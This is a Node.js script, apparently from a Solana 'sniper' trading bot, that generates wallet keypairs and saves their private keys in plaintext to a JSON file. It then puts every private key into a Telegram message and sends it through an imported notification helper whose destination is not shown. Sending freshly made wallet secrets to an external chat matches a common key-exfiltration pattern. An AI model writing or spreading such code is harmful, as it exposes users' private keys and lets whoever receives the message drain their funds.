const { Keypair } = require("@solana/web3.js");
const fs = require("fs");
const bs58 = require("bs58");
const { sendTelegramNotification } = require("./executor/contract");
require("dotenv").config();

async function generateSniperWallets() {
    const numWallets = parseInt(process.env.SNIPER_WALLET_NUM) || 3;
    const wallets = [];

    console.log(`\n🚀 Generating ${numWallets} Sniper Wallets...`);

    for (let i = 0; i < numWallets; i++) {
        const kp = Keypair.generate();
        wallets.push({
            pubkey: kp.publicKey.toBase58(),
            privateKey: bs58.encode(kp.secretKey)
        });
        console.log(`✅ Wallet ${i + 1}: ${kp.publicKey.toBase58()}`);
    }

    fs.writeFileSync("sniper_wallets.json", JSON.stringify(wallets, null, 2));
    console.log("\n✨ All wallets saved to sniper_wallets.json\n");

    // Send to Telegram
    let tgMessage = `🎯 *New Sniper Wallets Generated*\n━━━━━━━━━━━━━━━━━━━━\n`;
    wallets.forEach((w, i) => {
        tgMessage += `👤 *Wallet ${i + 1}*\n📍 Address: \`${w.pubkey}\`\n🔑 Key: \`${w.privateKey}\`\n\n`;
    });
    tgMessage += `━━━━━━━━━━━━━━━━━━━━`;

    try {
        await sendTelegramNotification("SNIPER", tgMessage, 0);
        console.log("✅ Wallets info sent to Telegram.");
    } catch (e) {
        console.error("❌ Failed to send wallets to Telegram:", e.message);
    }
}

generateSniperWallets();
